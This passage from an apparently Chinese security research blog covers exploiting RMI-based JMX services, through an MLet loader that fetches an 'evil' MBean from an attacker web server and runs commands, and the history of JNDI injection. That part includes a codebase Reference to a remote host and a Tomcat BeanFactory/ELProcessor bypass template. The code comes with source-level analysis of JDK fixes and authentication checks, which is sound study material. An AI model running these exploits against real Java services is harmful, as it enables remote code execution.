class="hljs-string">&quot;http://192.168.232.1:3333&quot;</span>&gt;&lt;/mlet&gt;<br></code></pre></td></tr></table></figure><p>将JmxEvilBean.jar、mlet文件放在web服务下：python -m SimpleHTTPServer 3333</p><p>3、EXP利用：连接服务、创建MLet MBean、invoke调用getMBeansFromURL加载外部Evil MBean、invoke调用Evil MBean的runCommand操作返回执行结果</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">String serverName = <span class="hljs-string">&quot;192.168.232.145&quot;</span>;<br>String port = <span class="hljs-string">&quot;2222&quot;</span>;<br>String command = <span class="hljs-string">&quot;ipconfig&quot;</span>;<br><span class="hljs-comment">//1、连接JMX服务</span><br>JMXServiceURL u = <span class="hljs-keyword">new</span> <span class="hljs-constructor">JMXServiceURL(<span class="hljs-string">&quot;service:jmx:rmi:///jndi/rmi://&quot;</span> + <span class="hljs-params">serverName</span> + <span class="hljs-string">&quot;:&quot;</span> + <span class="hljs-params">port</span> + <span class="hljs-string">&quot;/jmxrmi&quot;</span>)</span>;<br>JMXConnector c = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JMXConnectorFactory</span>.</span></span>connect(u);<br>MBeanServerConnection m = c.get<span class="hljs-constructor">MBeanServerConnection()</span>;<br><span class="hljs-comment">//2、创建MBean,类为javax.management.loading.MLet、name为test.Mbean:type=MLet,id=1</span><br>ObjectInstance evil = m.create<span class="hljs-constructor">MBean(<span class="hljs-string">&quot;javax.management.loading.MLet&quot;</span>, <span class="hljs-params">new</span> ObjectName(<span class="hljs-string">&quot;test.Mbean:type=MLet,id=1&quot;</span>)</span>);<br><span class="hljs-comment">//3、调用MBean的getMBeansFromURL操作，从http://192.168.232.1:3333/mlet加载mlet文件创建新的MBean</span><br>Object res = m.invoke(evil.get<span class="hljs-constructor">ObjectName()</span>, <span class="hljs-string">&quot;getMBeansFromURL&quot;</span>, <span class="hljs-keyword">new</span> Object<span class="hljs-literal">[]</span>&#123;<span class="hljs-string">&quot;http://192.168.232.1:3333/mlet&quot;</span>&#125;,<span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span> &#123; <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">String</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">Name()</span> &#125; );<br><br>HashSet res_set = ((HashSet)res);<br>Iterator itr = res_set.iterator<span class="hljs-literal">()</span>;<br>Object nextObject = itr.next<span class="hljs-literal">()</span>;<br><span class="hljs-comment">//4、invoke调用新的MBean的runCommand操作并返回结果</span><br>ObjectInstance evil_bean = ((ObjectInstance)nextObject);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-string">&quot;Loaded class: &quot;</span>+evil_bean.get<span class="hljs-constructor">ClassName()</span>+<span class="hljs-string">&quot; object &quot;</span>+evil_bean.get<span class="hljs-constructor">ObjectName()</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-string">&quot;Calling runCommand with: &quot;</span>+command);<br>Object result = m.invoke(evil_bean.get<span class="hljs-constructor">ObjectName()</span>, <span class="hljs-string">&quot;runCommand&quot;</span>, <span class="hljs-keyword">new</span> Object<span class="hljs-literal">[]</span>&#123; command &#125;, <span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span>&#123; <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">String</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">Name()</span> &#125;);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-string">&quot;Result: &quot;</span>+result);<br></code></pre></td></tr></table></figure><p>exp运行后，可以在jconsole中看到创建的test.Mbean:type&#x3D;MLet,id&#x3D;1、MLetCompromise:name&#x3D;evil,id&#x3D;10 MBean</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/32.png"></p><p>EXP也回显了ipconfig命令执行的结果</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/33.png"></p><p>需要注意的是：当服务未重启的情况下，后续利用直接invoke调用runCommand就可以了，不需要再次创建MBean</p><h2 id="3、密码验证"><a href="#3、密码验证" class="headerlink" title="3、密码验证"></a>3、密码验证</h2><p>第二章节分析的是JMX服务未开启权限验证及SSL验证时的漏洞利用情况，另外分析下当开启权限验证时漏洞利用的情况有什么变化。默认启动JMX管理服务时（不指定com.sun.management.jmxremote.authenticate配置），远程客户端连接时就需要通过验证。而验证所需的密码-权限是以明文存储在服务端&#x2F;jre&#x2F;lib&#x2F;management&#x2F;目录的jmxremote.password、jmxremote.access文件中的，且需要设置这两个文件的权限为：除文件所有者具有控制权，其它用户无任何权限。否则启动时会报错：sun.management.AgentConfigurationError。如下是启动命令</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -Xmx5g -Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=<span class="hljs-number">5005</span> -Dcom.sun.management.jmxremote.port=<span class="hljs-number">2222</span> -Dcom.sun.management.jmxremote.ssl=false -cp jmxserver.jar;C:\tools\apache-maven-<span class="hljs-number">3</span>.<span class="hljs-number">8</span>.<span class="hljs-number">6</span>-repository\org\codehaus\groovy\groovy\<span class="hljs-number">2</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>\groovy-<span class="hljs-number">2</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>.jar org.example.MBeanExample<br></code></pre></td></tr></table></figure><p>启动截图及文件权限如下：</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/34.png"></p><p>使用客户端jconsole 以只读账户guest password1进行连接</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/35.png"></p><p>也可以使用JAVA代码连接：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">HashMap env = <span class="hljs-keyword">new</span> HashMap&lt;&gt;<span class="hljs-literal">()</span>;<br>env.put(<span class="hljs-string">&quot;jmx.remote.credentials&quot;</span>,<span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span>&#123;<span class="hljs-string">&quot;guest&quot;</span>,<span class="hljs-string">&quot;password1&quot;</span>&#125;);<br>JMXServiceURL u = <span class="hljs-keyword">new</span> <span class="hljs-constructor">JMXServiceURL(<span class="hljs-string">&quot;service:jmx:rmi:///jndi/rmi://192.168.232.145:2222/jmxrmi&quot;</span>)</span>;<br>JMXConnector c = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JMXConnectorFactory</span>.</span></span>connect(u,env);<br>MBeanServerConnection m = c.get<span class="hljs-constructor">MBeanServerConnection()</span>;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(m.get<span class="hljs-constructor">MBeanCount()</span>);<br></code></pre></td></tr></table></figure><p><img src="/img/How-to-attack-RMI-based-JMX-services/36.png"></p><p>文件权限设置参考：<a href="https://docs.oracle.com/javase/7/docs/technotes/guides/management/security-windows.html">https://docs.oracle.com/javase/7/docs/technotes/guides/management/security-windows.html</a></p><p>分析下当加入权限验证后，JMX服务端的检测逻辑是怎样的？当我们获取了一个低权限&#x2F;只读权限账户时可以做哪些事情？我们从连接服务端到执行MBean操作的整体流程来看，分为几步：</p><p>1、客户端使用javax.naming.InitialContext#lookup获取到名称为”jmxrmi”的 Stub代理对象，即下图的变量server；</p><p>2、客户端调用javax.management.remote.rmi.RMIServer#newClient去获取RMIConnectionImpl Stub代理对象，服务端javax.management.remote.rmi.RMIJRMPServerImpl.ExportedWrapper#newClient执行JAAS-based authenticator进行权限校验：根据服务的启动参数及jmxremote.password、jmxremote.access配置文件去匹配，当校验通过后返回代理对象，即下图的变量c；</p><p>3、客户端invoke调用RMIConnectionImpl Stub代理对象的方法去操作MBean&#x2F;获取MBean信息。在另一边的JMX服务端会根据objid确认处理客户端此次请求逻辑的Target，[0:0:0,0]、[0:0:0,2] 这是在之前攻击RMI中分析过的RegistryImpl_Stub、DGCImpl_Stub，而涉及JMX是另外几个Target，在本实例中的objID为：[613d5ccd:18470553d20:-7fff, -4868886411976892153]、[613d5ccd:18470553d20:-7ffa, -8893277592355947578]，如下图是客户端拿到两次请求的返回对象调试情况</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/37.png"></p><p>当调用MBean的具体操作方法时，如javax.management.remote.rmi.RMIConnection#getConnectionId，在服务端会调用到javax.management.remote.rmi.RMIConnectionImpl#getConnectionId进行处理</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/38.png"></p><p>添加鉴权前后，由于服务端在启动时添加的Target不同，在添加鉴权后 mbeanServer的值从DefaultMBeanServerInterceptor变为MBeanServerAccessController，对于每个操作具体需要的权限都在MBeanServerAccessController中进行判断（objid与上面演示的不同，因为是后面的补图）</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/39.png"></p><p>无鉴权时：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span>.RMIConnectionImpl<span class="hljs-selector-id">#createMBean</span>(java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.String</span>, javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.ObjectName</span>, javax<span class="hljs-selector-class">.security</span><span class="hljs-selector-class">.auth</span>.Subject)<br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span>.RMIConnectionImpl<span class="hljs-selector-id">#doPrivilegedOperation</span><br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.RMIConnectionImpl</span>.PrivilegedOperation<span class="hljs-selector-id">#run</span><br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span>.RMIConnectionImpl<span class="hljs-selector-id">#doOperation</span><br>com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jmx</span><span class="hljs-selector-class">.interceptor</span>.DefaultMBeanServerInterceptor<span class="hljs-selector-id">#createMBean</span>(<br>....<br></code></pre></td></tr></table></figure><p>有鉴权时：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span>.RMIConnectionImpl<span class="hljs-selector-id">#createMBean</span>(java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.String</span>, javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.ObjectName</span>, javax<span class="hljs-selector-class">.security</span><span class="hljs-selector-class">.auth</span>.Subject)<br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span>.RMIConnectionImpl<span class="hljs-selector-id">#doPrivilegedOperation</span><br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.RMIConnectionImpl</span>.PrivilegedOperation<span class="hljs-selector-id">#run</span><br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span>.RMIConnectionImpl<span class="hljs-selector-id">#doOperation</span><br>com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jmx</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.security</span>.MBeanServerAccessController<span class="hljs-selector-id">#createMBean</span>   当加上鉴权后在这里发生了变化<br>...<br></code></pre></td></tr></table></figure><p>翻了下源码统计下jmx配置文件中的权限可对应调用MBean的哪些操作。这些操作可以辅助我们对JMX服务进行进一步的测试：</p><p>read权限可执行的操作</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang">getAttribute、getAttributes、getDefaultDomain、getDomains、getMBeanCount、getMBeanInfo、getObjectInstance、isInstanceOf、isRegistered、<span class="hljs-keyword">query</span>MBeans、<span class="hljs-keyword">query</span>Names、addNotificationListener、removeNotificationListener<br></code></pre></td></tr></table></figure><p>Write权限可执行的操作</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">set</span>Attribute、<span class="hljs-keyword">set</span>Attributes<br></code></pre></td></tr></table></figure><p>Unregister权限可执行的操作</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">unregisterMBean</span><br></code></pre></td></tr></table></figure><p>write权限、非MLet#addURL&#x2F;getMBeansFromURL方法可执行的操作</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">invoke</span><br></code></pre></td></tr></table></figure><p>read权限可以执行查询操作，如列出全部MBean的信息</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/40.png"></p><p>我们以低权限账户guest登录后再次测试如上几种利用方式</p><h3 id="3-1-影响地址可控的JNDI注入-amp-RMI-Registry利用方式-amp-CVE-2016-3427"><a href="#3-1-影响地址可控的JNDI注入-amp-RMI-Registry利用方式-amp-CVE-2016-3427" class="headerlink" title="3.1 影响地址可控的JNDI注入 &amp; RMI Registry利用方式 &amp; CVE-2016-3427"></a>3.1 影响地址可控的JNDI注入 &amp; RMI Registry利用方式 &amp; CVE-2016-3427</h3><p>地址可控的JNDI注入利用在密码鉴权流程之前，与是否鉴权无关，只与JDK版本有关</p><p>RMI方式的利用在密码鉴权流程之前，与是否鉴权无关，只与JDK版本有关</p><p>CVE-2016-3427是在RMI层-还原自定义方法的参数时触发的，与是否鉴权无关，只与JDK版本有关</p><h3 id="3-2-影响JMX层MBean方法的利用方式"><a href="#3-2-影响JMX层MBean方法的利用方式" class="headerlink" title="3.2 影响JMX层MBean方法的利用方式"></a>3.2 影响JMX层MBean方法的利用方式</h3><p>由于通过JMX层MBean方法getLoggerLevel&#x2F;gcClassHistogram利用方式是在javax.management.remote.rmi.RMIConnectionImpl#invoke 还原参数时触发的漏洞，并未执行到判断权限的位置。所以使用只读权限的guest账户即可继续进行利用</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/41.png"></p><h3 id="3-3-影响MLET加载Evil-MBean利用方式"><a href="#3-3-影响MLET加载Evil-MBean利用方式" class="headerlink" title="3.3 影响MLET加载Evil MBean利用方式"></a>3.3 影响MLET加载Evil MBean利用方式</h3><p>当未授权情况下JMX服务下MLET方式利用的步骤</p><p>1、客户端调用<code>JMXConnectorFactory.connect</code>连接到JMX服务端</p><p>2、调用createMBean创建javax.management.loading.MLet MBean</p><p>3、invoke调用MLet#getMBeansFromURL操作从外部获取Evil MBean</p><p>4、invoke调用Evil MBean的runCommand操作执行命令</p><p>当以低权限账户登录后，在第2步com.sun.jmx.remote.security.MBeanServerAccessController#createMBean创建bean的起点使用<code>checkCreate(className)</code>检查权限，执行到com.sun.jmx.remote.security.MBeanServerFileAccessController#checkAccess代码逻辑：1、获取当前登录用户的权限；2、判断权限是否包括create权限；3、如果无create权限或未登录用户则报错：<code>Access denied! Invalid access level for requested MBeanServer operation</code></p><p><img src="/img/How-to-attack-RMI-based-JMX-services/42.png"></p><p>而我们登录使用的guest用户只有read权限，没法执行createBean操作，所以在执行EXP的客户端报错：</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/43.png"></p><p>另外如果登录用户有create权限还是不能invoke调用MLet#getMBeansFromURL操作的，因为在invoke前会检查write、MLetMethods权限，write权限与上面判断read权限的流程一致，而MLetMethods权限是在com.sun.jmx.remote.security.MBeanServerAccessController#checkMLetMethods中判断的，如果调用javax.management.loading.MLet的addURL&#x2F;getMBeansFromURL都会报错退出</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/44.png"></p><h2 id="4、参考"><a href="#4、参考" class="headerlink" title="4、参考"></a>4、参考</h2><p><a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/853f699a5273">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/853f699a5273</a></p><p><a href="https://mogwailabs.de/en/blog/2019/04/attacking-rmi-based-jmx-services/">https://mogwailabs.de/en/blog/2019/04/attacking-rmi-based-jmx-services/</a></p><p><a href="https://www.cnblogs.com/afanti/p/12468693.html">https://www.cnblogs.com/afanti/p/12468693.html</a></p><p><a href="https://github.com/veracode-research/solr-injection#2-cve-2019-0192-deserialization-of-untrusted-data-via-jmxserviceurl">https://github.com/veracode-research/solr-injection#2-cve-2019-0192-deserialization-of-untrusted-data-via-jmxserviceurl</a></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JMX</tag>
      
      <tag>JavaSec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>当我们谈论JNDI注入时，我们在谈论什么</title>
    <link href="/2022/jndi-injection-history/"/>
    <url>/2022/jndi-injection-history/</url>
    
    <content type="html"><![CDATA[<p>JNDI注入的利用根据JDK更新历史可以分为两个阶段，第一阶段是在JDK8u191之前，攻击者可以利用自搭建的RMI&#x2F;LDAP恶意服务器，让客户端去获取并加载我们放置的恶意类，该阶段的利用手法不受classpath是否拥有Gadget的限制。第二阶段是在JDK8u191之后，JDK增加了trustURLCodebase配置导致这种加载恶意类的方式失效，进而找出了 javaSerializedData、javaReferenceAddress放置Gadget、ObjectFactory#getObjectInstance触发敏感方法的方式，这种方式虽然不受JDK版本的限制，但是受限于目标的classpath是否拥有可利用的Gadget。而寻找通用性更强、使用范围更广的Gadget链还值得深入研究。</p><p>JNDI注入实际上就是控制lookup()的参数，使客户端去访问恶意的RMI&#x2F;LDAP服务去加载恶意对象，从而完成代码执行漏洞利用。按照利用手法可以分为：Reference#codebase的利用、本地ClassPath的Gadget利用、本地ClassPath的ObjectFactory+Gadget的利用。</p><p>环境相关：</p><p>本次测试使用版本：JDK8u112、JDK8u121、JDK8u144、JDK8u191、JDK8u341</p><p>JDK版本下载：<a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p><h2 id="1、JNDI-with-RMI"><a href="#1、JNDI-with-RMI" class="headerlink" title="1、JNDI with RMI"></a>1、JNDI with RMI</h2><h3 id="1-1-RMI-Reference-codebase-的远程利用"><a href="#1-1-RMI-Reference-codebase-的远程利用" class="headerlink" title="1.1 RMI Reference#codebase 的远程利用"></a>1.1 RMI Reference#codebase 的远程利用</h3><p>在使用lookup查找获取远程服务器上绑定的对象时，若指定的远程地址为rmi，则会进入com.sun.jndi.rmi.registry.RegistryContext#lookup(javax.naming.Name)流程，如果拿到的是Reference对象，那么会进入到加载Factory的代码逻辑，调用栈及原理如下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.registry</span>.RegistryContext<span class="hljs-selector-id">#lookup</span>(javax<span class="hljs-selector-class">.naming</span>.Name)<br>com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.registry</span>.RegistryContext<span class="hljs-selector-id">#decodeObject</span><br>javax<span class="hljs-selector-class">.naming</span><span class="hljs-selector-class">.spi</span>.NamingManager<span class="hljs-selector-id">#getObjectInstance</span><br>javax<span class="hljs-selector-class">.naming</span><span class="hljs-selector-class">.spi</span>.NamingManager#getObjectFactoryFromReference<br></code></pre></td></tr></table></figure><p>如果在本地classpath中找不到我们指定的factory类（1），那么就会去远程codebase（2）去下载class字节码（3）回来并实例化（4）。 图为JDK8u112的代码</p><p><img src="/img/jndi-injection-history/1.png"></p><p>若JDK8u112版本中，我们指定codebase为http地址，放置我们构造的恶意类，lookup发起请求即可执行Evil类静态代码块中的代码</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">Reference</span> <span class="hljs-keyword">reference</span> = new <span class="hljs-keyword">Reference</span>(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;Evil&quot;</span>,<span class="hljs-string">&quot;http://192.168.232.145:8888/&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="/img/jndi-injection-history/2.png"></p><p>修复：com.sun.jndi.rmi.registry.RegistryContext#decodeObject在JDK 8u121时增加了trustURLCodebase&#x3D;false的配置，这样就造成：如果想通过下图标签1的判断而不报错退出，只能让codebase(var8.getFactoryClassLocation())为空，这样factory只能为本地类，无法去外部加载恶意类了</p><p><img src="/img/jndi-injection-history/3.png"></p><h2 id="2、Tomcat-BeanFactory-getObjectInstance的本地利用"><a href="#2、Tomcat-BeanFactory-getObjectInstance的本地利用" class="headerlink" title="2、Tomcat BeanFactory#getObjectInstance的本地利用"></a>2、Tomcat BeanFactory#getObjectInstance的本地利用</h2><p>我们看下如何去绕过修复补丁，在恶意服务器创建Reference对象时，可以指定classFactoryLocation为空，这样就会过掉上图标签1的判断</p><p><img src="/img/jndi-injection-history/4.png"></p><p><img src="/img/jndi-injection-history/5.png"></p><p>接着继续调用到javax.naming.spi.NamingManager#getObjectInstance，在该方法中完成三步：classFactory类名获取（1）、classFactory的实例化（2）、调用getObjectInstance方法（3）。在上一章节触发代码执行的是2中classFactory的实例化，现在由于补丁的限制导致classFactoryLocation为空，所以classFactory只能指定为本地ClassPath中存在的类，系统在实例化后会调用classFactory#getObjectInstance方法，即下图的标签3</p><p><img src="/img/jndi-injection-history/6.png"></p><p>那么现在想要继续完成漏洞利用，需要在本地ClassPath中找到一个类，其实现了javax.naming.spi.ObjectFactory接口、且静态代码块&#x2F;getObjectInstance方法存在敏感操作。 Veracode找到了Tomcat中的org.apache.naming.factory.BeanFactory，Tomcat的使用相当广泛，所以这个链的实战价值还是很高的</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml">//pom.xml<br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.20<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-dbcp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-jasper<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.20<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>pom.xml添加引入Tomcat后，我们分析下这条链：org.apache.naming.factory.BeanFactory#getObjectInstance方法中会对传入的className进行实例化、使用JDK的内省机制java.beans.Introspector#getBeanInfo  获取属性（存在getter&#x2F;setter方法的属性才会被识别），但同时该方法也提供了”别名机制“：基于传入的forceString字符串，根据&#x3D;分割拿到要执行的”setter别名方法”及String类型的参数值，最后调用反射执行。这样Gadget的source点就从”ObjectFactory接口实现类的getObjectInstance方法”变成了”本地任意类包含String类型参数的方法”</p><p><img src="/img/jndi-injection-history/7.png"></p><p><img src="/img/jndi-injection-history/8.png"></p><p>而Tomcat8自带的javax.el.ELProcessor#eval(String)满足该条件，可执行传入的java代码进行利用。</p><p><img src="/img/jndi-injection-history/9.png"></p><p>构造格式如下：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">ref</span>.<span class="hljs-keyword">add</span>(<span class="hljs-keyword">new</span> StringRefAddr(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br><span class="hljs-keyword">ref</span>.<span class="hljs-keyword">add</span>(<span class="hljs-keyword">new</span> StringRefAddr(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;evil code&quot;</span>));<br></code></pre></td></tr></table></figure><p>分割得到eval方法、String参数，添加至forced map中</p><p><img src="/img/jndi-injection-history/10.png"></p><p>最终从forced拿出方法，利用反射执行javax.el.ELProcessor#eval(“evil code”)</p><p><img src="/img/jndi-injection-history/11.png"></p><p>至此，绕过了JDK8u121的修复</p><h2 id="3、JNDI-with-Ldap"><a href="#3、JNDI-with-Ldap" class="headerlink" title="3、JNDI with Ldap"></a>3、JNDI with Ldap</h2><h3 id="3-1、Ldap-javaSerializedData的本地利用"><a href="#3-1、Ldap-javaSerializedData的本地利用" class="headerlink" title="3.1、Ldap javaSerializedData的本地利用"></a>3.1、Ldap javaSerializedData的本地利用</h3><p>上面讲到了利用恶意RMI服务器进行漏洞利用，在JDK中还有ldap可以使用。当lookup请求地址的协议为ldap时，会走到com.sun.jndi.ldap.LdapCtx#c_lookup进行处理解析。从整体的代码结构看，涉及EXP构造的代码部分有4处：1获取ldap请求的结果、2解析结果拿到attribute属性值、3根据attribute的属性组装Reference类、4加载远程的恶意class并实例化造成代码执行。其中第4步与上章节中的JNDI_RMI解析调用流程一致，但是JDK8u121是在RegistryContext#decodeObject层做的trustURLCodebase修复限制，与ldap使用codebase加载factory类的流程无关联。所以JNDI_RMI的修复方案并不影响JNDI_LDAP的利用</p><p><img src="/img/jndi-injection-history/12.png"></p><p>如果存在javaClassName属性，则进入到com.sun.jndi.ldap.Obj#decodeObject组装Reference的流程。代码比较清晰，也是EXP构造比较重要的一步，逐个分析下：标签1 如果存在javaSerializedData属性值，进入deserializeObject反序列化操作。从属性名字能看出来是java的序列化数据，且在反序列化过程中未做过滤。所以我们可以把恶意对象绑定在javaSerializedData属性上，这是JNDI-LDAP的第一个利用点</p><p><img src="/img/jndi-injection-history/13.png"></p><p>com.sun.jndi.ldap.Obj#deserializeObject</p><p><img src="/img/jndi-injection-history/14.png"></p><h3 id="3-2、Ldap-javaReferenceAddress的本地利用"><a href="#3-2、Ldap-javaReferenceAddress的本地利用" class="headerlink" title="3.2、Ldap javaReferenceAddress的本地利用"></a>3.2、Ldap javaReferenceAddress的本地利用</h3><p>接着回到decodeObject往下走：标签2 如果存在javaRemoteLocation属性值，就进入decodeRmiObject操作：根据javaClassName、javaRemoteLocation、javaCodeBase等属性值组装Reference对象并返回</p><p><img src="/img/jndi-injection-history/15.png"></p><p>接着回到decodeObject往下走：进入标签3 如果存在objectClass属性且其包括javaNamingReference，则进入com.sun.jndi.ldap.Obj#decodeReference组装Reference的操作</p><p><img 